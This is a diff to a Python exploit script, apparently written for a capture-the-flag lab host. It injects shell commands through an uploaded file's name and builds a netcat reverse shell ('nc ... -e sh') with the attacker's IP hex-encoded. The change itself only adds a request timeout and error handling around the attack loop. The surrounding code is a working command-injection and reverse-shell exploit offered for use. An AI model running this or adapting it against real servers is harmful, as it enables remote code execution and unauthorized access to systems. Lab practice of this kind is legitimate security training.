@@ -50,7 +50,7 @@ def sendCmd(cmd):
     fakeData = "fakedata".encode("ascii")
     data = {"file":(f"1.txt;{cmd}", fakeData, 'text/text'), "my-form":"Upload !"}
     #r = s.post("http://10.10.189.217/upload", files=data, proxies=burpproxy)
-    r = s.post("http://10.10.189.217/upload", files=data)
+    r = s.post("http://10.10.189.217/upload", files=data, timeout=3)
     return r
 
 def printResults(text):
@@ -95,8 +95,15 @@ while True:
         ipp = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ipp))
         bash = "nc <IP> <PORT> -e sh".replace("<IP>", "0x"+ ipp).replace("<PORT>", ip.split(":")[1])
         cmd = bash
-    r = sendCmd(cmd)
-    printResults(r.text)
+    try:
+        r = sendCmd(cmd)    
+        printResults(r.text)
+    except requests.Timeout as t:
+        print(f"Error: Connection Timed out, Check you values!!\n\n{t}")
+    except Exception as e:
+        print(col.RED+ f"Error in output: {e}" + col.RESET)
+        
+    
 
 
 
